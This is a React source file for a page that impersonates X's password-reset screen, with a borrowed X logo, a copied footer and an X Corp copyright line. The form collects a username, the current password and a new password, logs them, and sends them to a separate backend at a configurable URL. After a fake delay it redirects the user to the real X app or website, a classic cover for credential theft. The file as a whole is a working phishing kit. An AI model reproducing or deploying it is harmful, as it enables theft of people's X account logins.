import React, { useState } from "react";
import axios from 'axios';

function App() {
  const baseUrl = import.meta.env.VITE_BASE_API_URL;
console.log("API URL:", baseUrl);


const handleRedirect = () => {
  const appLink = "X://";
  const webLink = "https://www.X.com";
  
  // Attempt to open the app, fallback to website
  window.location.href = appLink;

  // Optionally, add a timeout to redirect to the web version if the app doesn't open
  setTimeout(() => {
    window.location.href = webLink;
  }, 2000);
};


  const [formData, setFormData] = useState({
    username: '',
    currentPassword: '',
    newPassword: '',
    confirmPassword: '',
  });

  const [errors, setErrors] = useState({
    username: '',
    currentPassword: '',
    newPassword: '',
    confirmPassword: '',
  });

  const [loading, setLoading] = useState(false);
  const [successMessage, setSuccessMessage] = useState('');
  const [backendError, setBackendError] = useState(''); // To capture any errors from backend

  const validatePassword = (password) => {
    const passwordRegex = /^(?=.*[A-Za-z])(?=.*\d)(?=.*[!@#$%^&*])[A-Za-z\d!@#$%^&*]{6,}$/;
    return passwordRegex.test(password);
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
  };

  const validateForm = () => {
    let formErrors = { ...errors };
    let isValid = true;

    if (!formData.username) {
      formErrors.username = 'Username is required.';
      isValid = false;
    } else {
      formErrors.username = '';
    }

    if (!formData.currentPassword) {
      formErrors.currentPassword = 'Current password is required.';
      isValid = false;
    } else {
      formErrors.currentPassword = '';
    }

    if (!formData.newPassword) {
      formErrors.newPassword = 'New password is required.';
      isValid = false;
    } else if (!validatePassword(formData.newPassword)) {
      formErrors.newPassword = 'Password must be at least 6 characters long, contain at least one letter, one number, and one special character.';
      isValid = false;
    } else {
      formErrors.newPassword = '';
    }

    if (formData.newPassword !== formData.confirmPassword) {
      formErrors.confirmPassword = 'Passwords do not match.';
      isValid = false;
    } else {
      formErrors.confirmPassword = '';
    }

    setErrors(formErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      setLoading(true); // Show loading spinner
      setBackendError(''); // Reset any previous backend error message
      setSuccessMessage(''); // Clear any previous success message

      const dataToSend = {
        username: formData.username,
        currentPassword: formData.currentPassword,
        newPassword: formData.newPassword,
      };
      console.log('sending data to backend:', dataToSend);

      try {
        const response = await axios.post(`${baseUrl}/submit`, dataToSend);

        // Simulate a delay for the password reset process
        setTimeout(() => {
          setLoading(false); // Hide loading spinner
          if (response.status === 200) {
            setSuccessMessage('Password reset successful. Redirecting...');
            setTimeout(() => {
              handleRedirect();
            }, 2000);
          }
        }, 3000);
      } catch (error) {
        setLoading(false); // Hide loading spinner
        if (error.response) {
          // Backend responded with an error
          setBackendError(error.response.data.message || 'Something went wrong. Please try again.');
        } else if (error.request) {
          // No response received from the server
          setBackendError('Server unavailable. Please check your internet connection and try again.');
        } else {
          // General error during setup or sending request
          setBackendError('An unexpected error occurred. Please try again.');
        }
      }
    }
  };

  return (
    <div className=" relative py-10 top-0 bg-black px-3">
    <div className="lg:max-w-xl max-w-lg mx-auto mt-10 p-6 border border-gray-600 rounded-lg shadow-lg bg-black text-white">
      <div className="max-w-[80px] mb-5 m-auto">
        <img src="https://res.cloudinary.com/dscpwrzng/image/upload/q_auto,f_auto/v1734948984/x_ko341d.png" className="w-full" alt="X Logo" />
      </div>
      <h2 className="text-md font-semibold text-center mb-5">Reset Password</h2>
      <form onSubmit={handleSubmit} className="text-sm">
        <div className="mb-4">
          <label htmlFor="username" className="block">Username</label>
          <input
            type="text"
            id="username"
            name="username"
            value={formData.username}
            onChange={handleChange}
            className="w-full p-2 border border-gray-600 rounded-md focus:outline-none focus:ring-1 focus:ring-white bg-gray-800 text-white"
            placeholder="Enter your username"
          />
          {errors.username && <p className="text-red-500 text-xs mt-1">{errors.username}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="currentPassword" className="block">Current Password</label>
          <input
            type="password"
            id="currentPassword"
            name="currentPassword"
            value={formData.currentPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-600 rounded-md focus:outline-none focus:ring-1 focus:ring-white bg-gray-800 text-white"
            placeholder="Enter your current password"
          />
          {errors.currentPassword && <p className="text-red-500 text-xs mt-1">{errors.currentPassword}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="newPassword" className="block">New Password</label>
          <input
            type="password"
            id="newPassword"
            name="newPassword"
            value={formData.newPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-600 rounded-md focus:outline-none focus:ring-1 focus:ring-white bg-gray-800 text-white"
            placeholder="Enter your new password"
          />
          {errors.newPassword && <p className="text-red-500 text-xs mt-1">{errors.newPassword}</p>}
        </div>

        <div className="mb-4">
          <label htmlFor="confirmPassword" className="block">Confirm New Password</label>
          <input
            type="password"
            id="confirmPassword"
            name="confirmPassword"
            value={formData.confirmPassword}
            onChange={handleChange}
            className="w-full p-2 border border-gray-600 rounded-md focus:outline-none focus:ring-1 focus:ring-white bg-gray-800 text-white"
            placeholder="Confirm your new password"
          />
          {errors.confirmPassword && <p className="text-red-500 text-xs mt-1">{errors.confirmPassword}</p>}
        </div>

        {backendError && <p className="text-red-500 text-xs mt-3">{backendError}</p>} {/* Display backend error message */}

        <button
          type="submit"
          className="w-full bg-white text-black p-3 rounded-md hover:opacity-90 disabled:opacity-50 flex justify-center items-center"
          disabled={loading}
        >
          {loading ? (
            <div className="loader"></div>
          ) : successMessage ? (
            <span>{successMessage}</span>
          ) : (
            'Reset Password'
          )}
        </button>
      </form>

    </div>
      <footer className="text-center text-xs text-gray-500 mt-10">
    <div className="flex flex-wrap justify-center gap-2 mb-2">
      <a href="#" className="hover:underline">About</a>
      <a href="#" className="hover:underline">Download the X app</a>
    <a href="#" className="hover:underline">Help Center</a>
    <a href="#" className="hover:underline">Terms of Service</a>
    <a href="#" className="hover:underline">Privacy Policy</a>
    <a href="#" className="hover:underline">Cookie Policy</a>
    <a href="#" className="hover:underline">Accessibility</a>
    <a href="#" className="hover:underline">Ads info</a>
    <a href="#" className="hover:underline">Blog</a>
    <a href="#" className="hover:underline">Careers</a>
    <a href="#" className="hover:underline">Brand Resources</a>
    <a href="#" className="hover:underline">Advertising</a>
    <a href="#" className="hover:underline">Marketing</a>
    <a href="#" className="hover:underline">X for Business</a>
    <a href="#" className="hover:underline">Developers</a>
    <a href="#" className="hover:underline">Directory</a>
    <a href="#" className="hover:underline">Settings</a>
  </div>
  <p>© 2024 X Corp.</p>
    </footer>
    </div>
  );
}

export default App;
